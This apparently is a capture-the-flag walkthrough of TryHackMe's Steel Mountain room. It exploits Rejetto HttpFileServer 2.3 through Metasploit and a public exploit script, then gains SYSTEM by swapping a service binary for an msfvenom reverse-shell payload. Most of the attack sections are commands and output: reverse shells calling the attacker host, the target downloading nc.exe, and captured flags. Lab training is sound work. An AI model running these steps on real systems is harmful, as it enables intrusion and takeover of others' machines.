---
title: "TryHackMe's Steel Mountain Room"
published: true
---

# TryHackMe's Steel Mountain Room

## Intro

Welcome to another exciting write-up on TryHackMe's Steel Mountain room! In this walkthrough, we'll dive into the process of gaining initial access, escalating privileges, and exploring alternative methods for achieving our objectives. This room is inspired by the TV series "Mr. Robot," and it presents a simulated environment where we can hone our ethical hacking skills.

## Initial Access

Our journey begins with an Nmap scan to identify open ports and services on the target machine.

```bash
root@ip-10-10-95-132:~# nmap -sV 10.10.28.113

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-19 13:32 BST
Nmap scan report for ip-10-10-28-113.eu-west-1.compute.internal (10.10.28.113)
Host is up (0.00072s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
8080/tcp  open  http         HttpFileServer httpd 2.3
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49163/tcp open  msrpc        Microsoft Windows RPC
```

The server on port 8080 is running Rejetto's HttpFileServer 2.3, which is known to have vulnerabilities.

```bash
root@ip-10-10-95-132:~# searchsploit rejetto httpfileserver 2.3
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                            | windows/webapps/49125.py
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We can also find a Metasploit module for this exploit:

```bash
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

Let's use the Metasploit module to exploit this vulnerability.

```bash
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.28.113
RHOSTS => 10.10.28.113
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
```

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.95.132:4444
[*] Using URL: http://10.10.95.132:8080/opZKYI
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /opZKYI
[*] Sending stage (175686 bytes) to 10.10.28.113
[!] Tried to delete %TEMP%\PcnOGDEcKnI.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.95.132:4444 -> 10.10.28.113:49223) at 2024-09-19 13:56:23 +0100
[*] Server stopped.

meterpreter >
```

```bash
meterpreter > getuid
Server username: STEELMOUNTAIN\bill
```

With a Meterpreter shell, we can explore the filesystem and locate the user flag.

```bash
meterpreter > shell
Process 2716 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill>dir /B /S *txt*
dir /B /S *txt*
C:\Users\bill\AppData\Local\Microsoft\Internet Explorer\brndlog.txt
C:\Users\bill\Desktop\user.txt

C:\Users\bill>type C:\Users\bill\Desktop\user.txt
type C:\Users\bill\Desktop\user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

## Privilege Escalation

Next, we aim to escalate our privileges. We'll use PowerUp, a PowerShell script from the PowerSploit framework, to identify potential privilege escalation vectors.

```bash
root@ip-10-10-95-132:~# mkdir workspace
root@ip-10-10-95-132:~# cd workspace/
root@ip-10-10-95-132:~/workspace# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
--2024-09-19 14:10:27--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: \u2018PowerUp.ps1\u2019

PowerUp.ps1                                100%[=====================================================================================>] 586.50K  --.-KB/s    in 0.006s

2024-09-19 14:10:27 (97.6 MB/s) - \u2018PowerUp.ps1\u2019 saved [600580/600580]
```

Upload the script to the target machine and execute it.

```bash
meterpreter > upload /root/workspace/PowerUp.ps1
[*] Uploading  : /root/workspace/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/workspace/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /root/workspace/PowerUp.ps1 -> PowerUp.ps1
```

```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
...
```

The scan reveals a vulnerable service with an executable that we can manipulate and that can be restarted.  
We'll craft a malicious executable and replace the vulnerable service binary.

```bash
root@ip-10-10-95-132:~/workspace# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.95.132 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
```

Upload and replace the service binary, then restart the service.

```bash
PS > ^C
Terminate channel 4? [y/N]  y
meterpreter > upload /root/workspace/Advanced.exe
[*] Uploading  : /root/workspace/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/workspace/Advanced.exe -> Advanced.exe
[*] Completed  : /root/workspace/Advanced.exe -> Advanced.exe
```

On another terminal tab start a listener

```bash
root@ip-10-10-95-132:~/workspace# nc -lvnp 4443
Listening on [0.0.0.0] (family 0, port 4443)
```

```bash
PS > Stop-Service -Name AdvancedSystemCareService9
PS > cp Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
PS > Start-Service -Name AdvancedSystemCareService9
ERROR: Start-Service : Failed to start service 'Advanced SystemCare Service 9 (AdvancedSystemCareService9)'.
ERROR: At line:1 char:1
ERROR: + Start-Service -Name AdvancedSystemCareService9
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
ERROR:    ServiceCommandException
ERROR:     + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.StartServiceCommand
ERROR:
```

The listener should catch a shell:

```bash
root@ip-10-10-95-132:~/workspace# nc -lvnp 4443
Listening on [0.0.0.0] (family 0, port 4443)
Connection from 10.10.28.113 49278 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

With SYSTEM privileges, we can now access the root flag.

```bash
C:\Users>dir /S /B *txt*
dir /S /B *txt*
...
C:\Users\Administrator\AppData\Local\Temp\Setup Log 2019-09-26 #001.txt
C:\Users\Administrator\AppData\Local\Temp\Setup Log 2019-09-26 #002.txt
C:\Users\Administrator\AppData\Roaming\IObit\Advanced SystemCare\Startup Manager\SMLog.txt
C:\Users\Administrator\Desktop\root.txt
C:\Users\All Users\Amazon\EC2-Windows\Launch\Readme.txt
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt
C:\Users\bill\AppData\Local\Microsoft\Internet Explorer\brndlog.txt
C:\Users\bill\Desktop\user.txt
```

```bash
C:\Users>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
9af5f314f57607c00fd09803a587db80
```

## Access and Escalation without Metasploit

For those interested in an alternative approach, we can exploit the vulnerability without using Metasploit. First, download the exploit script and a static version of Netcat.

```bash
root@ip-10-10-95-132:~/workspace# wget https://www.exploit-db.com/download/39161
--2024-09-19 15:01:41--  https://www.exploit-db.com/download/39161
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2515 (2.5K) [application/txt]
Saving to: \u201839161\u2019

39161                                      100%[=====================================================================================>]   2.46K  --.-KB/s    in 0s

2024-09-19 15:01:41 (358 MB/s) - \u201839161\u2019 saved [2515/2515]

root@ip-10-10-95-132:~/workspace# mv 39161 39161.py
```

```bash
root@ip-10-10-95-132:~/workspace# wget https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
--2024-09-19 15:04:56--  https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
Resolving github.com (github.com)... 4.208.26.197
Connecting to github.com (github.com)|4.208.26.197|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: \u2018ncat.exe\u2019

ncat.exe                                       [ <=>                                                                                  ] 298.47K  --.-KB/s    in 0.005s

2024-09-19 15:04:56 (61.7 MB/s) - \u2018ncat.exe\u2019 saved [305632]

root@ip-10-10-95-132:~/workspace# mv ncat.exe nc.exe
```

The exploit seems to require a http server on port 80, but the attack box used for this room has that port occupied by the browser VNC connection.  
The following is a workaround to free port 80.  
Connect to your AttackBox via VNC (remmina, RealVNC or tightvnc for example). Use port 5901 and the public ip, username and password of your attack box.  
Then you will work on your new VNC connection, not in the browser. Close browser VNC window.

```bash
root@ip-10-10-95-132:~/.vnc# fuser -n tcp 80
80/tcp:               2593
root@ip-10-10-95-132:~/.vnc# kill -TERM 2593
```

Start a python HTTP server to serve the netcat executable

```bash
root@ip-10-10-95-132:~/workspace# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now open the script with a text editor and modify the line  
_ip_addr = "192.168.44.128" #local IP address_ with the IP of your attacking machine.

Start a listener

```bash
root@ip-10-10-95-132:~/workspace# nc -lvnp 443
Listening on [0.0.0.0] (family 0, port 443)
```

Run the exploit script:

```bash
root@ip-10-10-95-132:~/workspace# python2 39161.py 10.10.28.113 8080
```

The first time you run it, it will upload the netcat executable on the target.  
You can check this looking at the output of the HTTP server:

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.28.113 - - [19/Sep/2024 15:54:23] "GET /nc.exe HTTP/1.1" 200 -
10.10.28.113 - - [19/Sep/2024 15:54:23] "GET /nc.exe HTTP/1.1" 200 -
10.10.28.113 - - [19/Sep/2024 15:54:23] "GET /nc.exe HTTP/1.1" 200 -
10.10.28.113 - - [19/Sep/2024 15:54:23] "GET /nc.exe HTTP/1.1" 200 -
```

Still no shell though at this point, we need to run the exploit again.  
To be honest this exploit appears to be buggy, it may require to run it several times for it to work.  
Once the exploit is successful, proceed with privilege escalation as described earlier.

## Conclusion

In this write-up, we covered the steps to exploit Rejetto's HttpFileServer 2.3, gain initial access, and achieve privilege escalation using both Metasploit and manual methods. The Steel Mountain room on TryHackMe offers a great opportunity to practice and refine your ethical hacking skills. Happy hacking!
